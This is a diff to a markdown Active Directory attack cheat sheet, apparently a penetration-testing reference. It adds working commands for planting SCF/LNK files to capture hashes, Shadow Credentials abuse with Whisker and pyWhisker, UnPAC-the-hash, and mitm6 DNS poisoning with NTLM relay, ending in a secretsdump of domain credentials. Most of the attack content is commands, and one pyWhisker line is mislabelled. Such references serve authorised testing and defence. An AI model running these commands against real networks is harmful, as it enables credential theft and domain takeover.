@@ -58,6 +58,7 @@
     - [OverPass-the-Hash (pass the key)](#overpass-the-hash-pass-the-key)
       - [Using impacket](#using-impacket)
       - [Using Rubeus](#using-rubeus)
+    - [UnPAC The Hash](#unpac-the-hash)
     - [Capturing and cracking Net-NTLMv1/NTLMv1 hashes](#capturing-and-cracking-net-ntlmv1ntlmv1-hashes)
     - [Capturing and cracking Net-NTLMv2/NTLMv2 hashes](#capturing-and-cracking-net-ntlmv2ntlmv2-hashes)
     - [Man-in-the-Middle attacks & relaying](#man-in-the-middle-attacks--relaying)
@@ -67,7 +68,7 @@
       - [Drop the MIC](#drop-the-mic)
       - [Ghost Potato - CVE-2019-1384](#ghost-potato---cve-2019-1384)
       - [RemotePotato0 DCOM DCE RPC relay](#remotepotato0-dcom-dce-rpc-relay)
-      - [Relay delegation with mitm6](#relay-delegation-with-mitm6)
+      - [DNS Poisonning - Relay delegation with mitm6](#dns-poisonning---relay-delegation-with-mitm6)
     - [Active Directory Certificate Services](#active-directory-certificate-services)
       - [ESC1 - Misconfigured Certificate Templates](#esc1---misconfigured-certificate-templates)
       - [ESC2 - Misconfigured Certificate Templates](#esc2---misconfigured-certificate-templates)
@@ -750,6 +751,14 @@ IconFile=\\10.10.10.10\Share\test.ico
 Command=ToggleDesktop
 ```
 
+Using [`crackmapexec`](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/modules/slinky.py):
+
+```ps1
+crackmapexec smb 10.10.10.10 -u username -p password -M scuffy -o NAME=WORK SERVER=IP_RESPONDER #scf
+crackmapexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER #lnk
+crackmapexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER CLEANUP
+```
+
 #### URL Files
 
 This attack also works with `.url` files and `responder -I eth0 -v`.
@@ -1216,6 +1225,7 @@ LDAP        10.0.2.11       389    dc01       krbtgt     badpwdcount: 0 pwdLastS
 ### Password in AD User comment
 
 ```powershell
+$ crackmapexec ldap domain.lab -u 'username' -p 'password' -M user-desc
 $ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 -M get-desc-users
 GET-DESC... 10.0.2.11       389    dc01    [+] Found following users: 
 GET-DESC... 10.0.2.11       389    dc01    User: Guest description: Built-in account for guest access to the computer/domain
@@ -1593,32 +1603,43 @@ C:\Rubeus> john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproa
 
 ### Shadow Credentials
 
-Requirements :
+> Add **Key Credentials** to the attribute `msDS-KeyCredentialLink` of the target user/computer object and then perform Kerberos authentication as that account using PKINIT to obtain a TGT for that user.
+
+:warning: User objects can't edit their own `msDS-KeyCredentialLink` attribute while computer objects can. Computer objects can edit their own msDS-KeyCredentialLink attribute but can only add a KeyCredential if none already exists
+
+**Requirements**:
 * Domain Controller on (at least) Windows Server 2016
 * PKINIT Kerberos authentication
 * An account with the delegated rights to write to the `msDS-KeyCredentialLink` attribute of the target object
 
-Add **Key Credentials** to the attribute `msDS-KeyCredentialLink` of the target user/computer object and then perform Kerberos authentication as that account using PKINIT to obtain a TGT for that user.
+**Exploitation**: 
+- From Windows, use [Whisker](https://github.com/eladshamir/Whisker):
+  ```powershell
+  # Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.
+  Whisker.exe list /target:computername$
+  # Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device.
+  Whisker.exe add /target:"TARGET_SAMNAME" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
+  Whisker.exe add /target:computername$ [/domain:constoso.local /dc:dc1.contoso.local /path:C:\path\to\file.pfx /password:P@ssword1]
+  # Removes a key credential from the target object specified by a DeviceID GUID.
+  Whisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /remove:2de4643a-2e0b-438f-a99d-5cb058b3254b
+  ```
 
- - From Windows, use [Whisker](https://github.com/eladshamir/Whisker):
-    ```powershell
-    # Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.
-    Whisker.exe list /target:computername$
-    # Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device.
-    Whisker.exe add /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /path:C:\path\to\file.pfx /password:P@ssword1
-    # Removes a key credential from the target object specified by a DeviceID GUID.
-    Whisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /remove:2de4643a-2e0b-438f-a99d-5cb058b3254b
-    ```
+- From Linux, use [pyWhisker](https://github.com/ShutdownRepo/pyWhisker):
+  ```bash
+  # Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.
+  python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "list"
+  # Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device.
+  pywhisker.py -d "FQDN_DOMAIN" -u "user1" -p "CERTIFICATE_PASSWORD" --target "TARGET_SAMNAME" --action "list"
+  python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "add" --filename "test1"
+  # Removes a key credential from the target object specified by a DeviceID GUID.
+  python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "remove" --device-id "a8ce856e-9b58-61f9-8fd3-b079689eb46e"
+  ```
 
- - From Linux, use [pyWhisker](https://github.com/ShutdownRepo/pyWhisker):
-    ```bash
-    # Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.
-    python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "list"
-    # Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device.
-    python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "add" --filename "test1"
-    # Removes a key credential from the target object specified by a DeviceID GUID.
-    python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "remove" --device-id "a8ce856e-9b58-61f9-8fd3-b079689eb46e"
-    ```
+**Scenario**:
+- Trigger an NTLM authentication from `DC01` (PetitPotam)
+- Relay it to `DC02` (ntlmrelayx)
+- Edit `DC01`'s attribute to create a Kerberos PKINIT pre-authentication backdoor (pywhisker)
+- Alternatively : `ntlmrelayx -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$'`
 
 
 ### Pass-the-Hash
@@ -1694,7 +1715,21 @@ root@kali:~$ klist
 .\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\Windows\System32\cmd.exe
 ```
 
+### UnPAC The Hash
 
+* Windows
+    ```ps1
+    # request a ticket using a certificate and use /getcredentials to retrieve the NT hash in the PAC.
+    C:/> Rubeus.exe asktgt /getcredentials /user:"TARGET_SAMNAME" /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
+    ```
+* Linux
+    ```ps1
+    # obtain a TGT by validating a PKINIT pre-authentication
+    $ gettgtpkinit.py -cert-pfx "PATH_TO_CERTIFICATE" -pfx-pass "CERTIFICATE_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
+    
+    # use the session key to recover the NT hash
+    $ export KRB5CCNAME="TGT_CCACHE_FILE" getnthash.py -key 'AS-REP encryption key' 'FQDN_DOMAIN'/'TARGET_SAMNAME'
+    ```
 
 ### Capturing and cracking Net-NTLMv1/NTLMv1 hashes
 
@@ -1928,7 +1963,7 @@ Terminal> psexec.py 'LAB/winrm_user_1:Password123!@192.168.83.135'
 ```
 
 
-#### Relay delegation with mitm6
+#### DNS Poisonning - Relay delegation with mitm6
 
 Requirements: 
 - IPv6 enabled (Windows prefers IPV6 over IPv4)
@@ -1942,12 +1977,27 @@ cd /opt/tools/mitm6
 pip install .
 
 mitm6 -hw ws02 -d lab.local --ignore-nofqnd
+# -d: the domain name that we filter our request on (the attacked domain)
+# -i: the interface we have mitm6 listen on for events
+# -hw: host whitelist
+
+ntlmrelayx.py -ip 10.10.10.10 -t ldaps://dc01.lab.local -wh attacker-wpad
+ntlmrelayx.py -ip 10.10.10.10 -t ldaps://dc01.lab.local -wh attacker-wpad --add-computer
+# -ip: the interface you want the relay to run on
+# -wh: WPAD host, specifying your wpad file to serve
+# -t: the target where you want to relay to
+
+# now granting delegation rights and then do a RBCD
 ntlmrelayx.py -t ldaps://dc01.lab.local --delegate-access --no-smb-server -wh attacker-wpad
-then use rubeus with s4u to relay the delegation
+getST.py -spn cifs/target.lab.local lab.local/GENERATED\$ -impersonate Administrator  
+export KRB5CCNAME=administrator.ccache  
+secretsdump.py -k -no-pass target.lab.local  
 ```
 
 
 ### Active Directory Certificate Services
+
+Find ADCS Server : `crackmapexec ldap domain.lab -u username -p password -M adcs`
 
 #### ESC1 - Misconfigured Certificate Templates
 
@@ -3111,7 +3161,7 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [New lateral movement techniques abuse DCOM technology - Philip Tsukerman - Jan 25, 2018](https://www.cybereason.com/blog/dcom-lateral-movement-techniques)
 * [Kerberos Tickets on Linux Red Teams - April 01, 2020 | by Trevor Haskell](https://www.fireeye.com/blog/threat-research/2020/04/kerberos-tickets-on-linux-red-teams.html)
 * [AD CS relay attack - practical guide - 23 Jun 2021 - @exandroiddev](https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/)
-* [Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover - Elad Shamir - Jun 17](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab#Previous%20Work)
+* [Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover - Elad Shamir - Jun 17](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
 * [Playing with PrintNightmare - 0xdf - Jul 8, 2021](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html)
 * [Attacking Active Directory: 0 to 0.9 - Eloy Pérez González - 2021/05/29](https://zer1t0.gitlab.io/posts/attacking_ad/)
 * [Microsoft ADCS – Abusing PKI in Active Directory Environment - Jean MARSAULT - 14/06/2021](https://www.riskinsight-wavestone.com/en/2021/06/microsoft-adcs-abusing-pki-in-active-directory-environment/)
@@ -3121,3 +3171,4 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [Certified Pre-Owned - Will Schroeder - Jun 17 2021](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
 * [AD CS/PKI template exploit via PetitPotam and NTLMRelayx, from 0 to DomainAdmin in 4 steps by frank | Jul 23, 2021](https://www.bussink.net/ad-cs-exploit-via-petitpotam-from-0-to-domain-domain/)
 * [NTLMv1_Downgrade.md - S3cur3Th1sSh1t - 09/07/2021](https://gist.github.com/S3cur3Th1sSh1t/0c017018c2000b1d5eddf2d6a194b7bb)
+* [UnPAC the hash - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash)
